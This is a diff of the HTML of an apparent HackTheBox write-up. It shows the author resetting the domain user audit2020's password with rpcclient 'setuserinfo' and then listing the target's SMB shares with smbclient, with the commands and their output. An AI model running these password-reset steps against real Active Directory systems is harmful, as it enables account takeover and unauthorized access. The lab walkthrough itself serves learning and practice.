@@ -356,9 +356,7 @@ rpcclient $&gt;
 8
 9
 10
-11
-</pre><td class="rouge-code"><pre>
-rpcclient <span class="nv">$&gt;</span> setuserinfo
+</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> setuserinfo
 Usage: setuserinfo username level password <span class="o">[</span>password_expired]
 result was NT_STATUS_INVALID_PARAMETER
 rpcclient <span class="nv">$&gt;</span> setuserinfo svc_backup 23 p@ssw0rd123
@@ -368,7 +366,13 @@ rpcclient <span class="nv">$&gt;</span> setuserinfo Administrator 23 p@ssw0rd123
 result: NT_STATUS_ACCESS_DENIED
 result was NT_STATUS_ACCESS_DENIED
 rpcclient <span class="nv">$&gt;</span> 
-</pre></table></code></div></div><p>Of course as you see we can’t change password of any administrator or high priv account you can read more in this <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">awesome article</a> after that I found that we can change audit2020 password let’s try it</p><p>sh``` rpcclient $&gt; setuserinfo audit2020 23 p@ssw0rd123 rpcclient $&gt;</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Of course as you see we can’t change password of any administrator or high priv account you can read more in this <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">awesome article</a> after that I found that we can change audit2020 password let’s try it</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>
+rpcclient <span class="nv">$&gt;</span> setuserinfo audit2020 23 p@ssw0rd123
+rpcclient <span class="nv">$&gt;</span>
+</pre></table></code></div></div><p>Hahaha :D no error it means that it worked let’s check that we changed the user password by trying to log in samba</p><p>sh``` [cantchasee@arch ~]$ smbclient -U audit2020 -L 10.10.10.192 Enter WORKGROUP\audit2020’s password:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -377,33 +381,15 @@ rpcclient <span class="nv">$&gt;</span>
 7
 8
 9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-</pre><td class="rouge-code"><pre>
-Hahaha :D no error it means that it worked let’s check that we changed the user password by trying to log in samba
-
-sh```
-[cantchasee@arch ~]$ smbclient -U audit2020 -L 10.10.10.192
-Enter WORKGROUP\audit2020's password: 
-
-		Sharename       Type      Comment
-		---------       ----      -------
-		ADMIN$          Disk      Remote Admin
-		C$              Disk      Default share
-		forensic        Disk      Forensic / Audit share.
-		IPC$            IPC       Remote IPC
-		NETLOGON        Disk      Logon server share 
-		profiles$       Disk      
-		SYSVOL          Disk      Logon server share 
-SMB1 disabled -- no workgroup available
-[cantchasee@arch ~]$ 
+</pre><td class="rouge-code"><pre>	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	forensic        Disk      Forensic / Audit share.
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	profiles$       Disk      
+	SYSVOL          Disk      Logon server share  SMB1 disabled -- no workgroup available [cantchasee@arch ~]$  ```
 </pre></table></code></div></div><p>It worked from the user name I can say that we may have access to forensic share let’s give it a shot</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
